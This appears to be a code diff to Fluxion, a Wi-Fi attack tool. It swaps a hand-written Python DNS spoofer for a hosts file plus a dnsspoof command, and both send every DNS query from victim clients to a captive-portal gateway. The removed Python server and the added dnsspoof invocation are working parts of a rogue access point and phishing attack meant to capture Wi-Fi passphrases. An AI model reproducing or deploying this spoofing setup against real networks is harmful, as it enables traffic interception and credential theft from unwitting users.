@@ -749,92 +749,15 @@ index-file.names = (
 " >>"$FLUXIONWorkspacePath/lighttpd.conf"
   fi
 
-  # Create a DNS service with python, forwarding all traffic to gateway.
+  # Create a temporary hosts file to be used with dnsspoof
   echo "\
-import sys, traceback, socket
-# NOTICE: This DNS server works with python 2 and python 3
+${CaptivePortalGatewayAddress}	*.*
+172.217.5.238	google.com
+172.217.13.78	clients3.google.com
+172.217.13.78	clients4.google.com
+" >"$FLUXIONWorkspacePath/hosts"
 
-class DNSQuery:
-  def __init__(self, data):
-    self.data = data
-    self.domain = ''
-
-    queryType = (ord(data[2]) >> 3) & 15
-
-    # Only handle basic requests.
-    if queryType != 0:
-      print('Ignoring Query: Non-spoofed type.')
-      return
-
-    domainStart = 13 # Skip length byte and start at domain.
-    domainLength = ord(data[domainStart - 1]) # Evaluate length byte.
-
-    while domainLength != 0:
-      self.domain += data[domainStart : domainStart + domainLength] + '.'
-
-      domainStart += domainLength + 1 # Skip the length byte & start at domain.
-      domainLength = ord(data[domainStart - 1]) # Evaluate length byte.
-
-  def response(self, ipv4):
-    if not self.domain: return ''
-
-    packet = ''
-
-    packet += self.data[ :2] + '\x81\x80'
-    packet += self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
-    packet += self.data[12:]
-    packet += '\xc0\x0c'
-    packet += '\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
-
-    # Convert string IPv4 quads to binary values (bytes).
-    packet += str.join('', map(lambda s: chr(int(s)), ipv4.split('.')))
-
-    return packet
-
-if __name__ == '__main__':
-  targetIPv4 = '$CaptivePortalGatewayAddress'
-
-  print('Mini DNS Spoofer:: dom.query. 60 IN A %s' % targetIPv4)
-
-  link = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  link.bind(('',53))
-
-  try:
-    while True:
-      clientData, clientIPv4 = link.recvfrom(1024)
-
-      queryData = clientData if sys.version_info < (3, 0) else clientData.decode('unicode_escape')
-
-      query = DNSQuery(queryData)
-
-      response = query.response(targetIPv4)
-
-      if sys.version_info > (3, 0):
-        # Someone that knows more about python and how it does byte-handling,
-        # please fix the following shitfest and make it a bit more elegant.
-        # Do what? A raw conversion of the \"response\" string to bytes.
-        responseHex = ''
-        for xx in response:
-          responseHex += \"%x%x\" % ((ord(xx) >> 4) & 0b1111, ord(xx) & 0b1111)
-
-        response = bytearray.fromhex(responseHex)
-
-      link.sendto(response, clientIPv4)
-
-      print('Request: %s -> %s' % (query.domain, targetIPv4))
-
-  except KeyboardInterrupt:
-    print('INTERRUPT: Stopping.')
-    link.close()
-
-  except Exception as error:
-    print('EXCEPTION: Stopping!')
-    print(error)
-    print(traceback.format_exc())
-    link.close()
-" >"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
-
-  chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
+  #chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
 
   local -r targetSSIDCleanNormalized=${FluxionTargetSSIDClean//"/\\"}
   # Attack arbiter script
@@ -1436,7 +1359,7 @@ stop_attack() {
     CaptivePortalWebServicePID="" # Clear service PID
   fi
 
-  # Kill python DNS service if one is found.
+  # Kill DNS service if one is found.
   if [ "$CaptivePortalDNSServiceXtermPID" ]; then
     kill $(pgrep -P $CaptivePortalDNSServiceXtermPID \
       2> $FLUXIONOutputDevice) &> $FLUXIONOutputDevice
@@ -1503,7 +1426,7 @@ start_attack() {
   echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
   xterm $FLUXIONHoldXterm $BOTTOMLEFT -bg black -fg "#99CCFF" \
     -title "FLUXION AP DNS Service" -e \
-    "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; fi" &
+    "dnsspoof -i ${CaptivePortalAccessInterface} -f \"$FLUXIONWorkspacePath/hosts\"" &
   # Save parent's pid, to get to child later.
   CaptivePortalDNSServiceXtermPID=$!
 
